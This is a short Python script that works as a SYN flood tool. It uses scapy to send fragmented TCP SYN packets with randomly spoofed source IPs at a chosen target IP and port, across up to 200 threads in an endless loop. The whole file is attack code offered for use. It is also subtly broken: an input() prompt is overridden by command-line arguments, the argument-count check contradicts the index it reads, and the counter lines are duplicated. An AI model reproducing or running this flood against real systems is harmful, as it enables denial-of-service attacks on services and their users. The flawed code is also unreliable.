import socket
from socket import *
import random
import sys
import threading
from scapy.all import *
import logging
logging.getLogger("scapy.runtime").setLevel(logging.ERROR)

class sendSYN(threading.Thread):
    global target, port
    def __init__(self):
        threading.Thread.__init__(self)
    
    def run(self):
        ip = IP()
        ip.src = "%i.%i.%i.%i" % (random.randint(1,254),random.randint(1,254),random.randint(1,254),random.randint(1,254))
        ip.dst = target

        protocol = TCP()
        protocol.sport = random.randint(1,65535)
        protocol.dport = port
        protocol.flags = "S"

        packet = ip/protocol

        fragments = fragment(packet, fragsize=2048)

        send(fragments, verbose = 0)

target = input("Enter target IP: ")
port = input("Enter target port: ")
thread_limit = 200
total = 0

if __name__ == "__main__":
    if len(sys.argv) != 2:
        print("Usage: %s <target IP>" % sys.argv[0])
        sys.exit(1)

    target = sys.argv[1]
    port = int(sys.argv[2])
    conf.iface = "eth0"

    while True:
        if threading.activeCount() < thread_limit:
            sendSYN().start()
            total += 1
            sys.stdout.write("\rTotal packets sent:\t\t\t%i" % total)
            total += 1
            sys.stdout.write("\rTotal packets sent:\t\t\t%i" % total)